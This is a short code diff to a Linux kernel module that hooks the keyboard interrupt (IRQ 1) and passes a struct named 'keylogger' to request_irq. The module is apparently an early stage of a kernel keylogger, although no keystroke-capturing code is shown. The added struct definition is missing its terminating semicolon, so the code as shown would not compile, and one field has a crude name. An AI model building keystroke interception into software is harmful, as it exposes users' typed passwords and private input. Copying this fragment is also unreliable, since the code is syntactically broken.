@@ -67,7 +67,13 @@ int init_module(void)
 
 	// if interrupt here wrong or irq, gotta ditch the usb and go PURE PS2
 	int kb_irq = 1;
-	int req_irq_result = request_irq(kb_irq, &handler, IRQF_SHARED, "my_keyboard", NULL);
+	struct test { 
+		int gay;
+	}
+	struct test keylogger = {
+		.gay = 1,
+	};
+	int req_irq_result = request_irq(kb_irq, &handler, IRQF_SHARED, "my_keyboard", &keylogger);
 	if (req_irq_result < 0)
 		printk(KERN_INFO "IRQ REQUEST ERR !: %d\n", req_irq_result);
 	else
